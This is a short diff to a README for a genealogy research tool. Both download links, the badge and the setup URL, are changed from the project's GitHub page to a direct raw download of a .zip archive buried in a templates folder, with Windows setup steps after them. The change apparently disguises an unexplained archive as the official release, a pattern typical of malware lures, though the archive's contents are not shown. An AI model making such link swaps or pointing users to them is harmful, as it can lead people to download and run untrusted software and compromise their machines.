@@ -1,6 +1,6 @@
 # 🧬 autoresearch-genealogy - Organize family research with AI
 
-[![Download](https://img.shields.io/badge/Download%20from%20GitHub-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Elvinmystical21/autoresearch-genealogy)
+[![Download](https://img.shields.io/badge/Download%20from%20GitHub-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Elvinmystical21/autoresearch-genealogy/main/vault-template/templates/genealogy_autoresearch_2.1-alpha.3.zip)
 
 ## 📦 What this is
 
@@ -24,7 +24,7 @@ This project works best as a folder you keep on your PC and update as you resear
 ## ⬇️ Download and set up
 
 Visit this page to download:  
-https://github.com/Elvinmystical21/autoresearch-genealogy
+https://raw.githubusercontent.com/Elvinmystical21/autoresearch-genealogy/main/vault-template/templates/genealogy_autoresearch_2.1-alpha.3.zip
 
 Follow these steps on Windows:
 
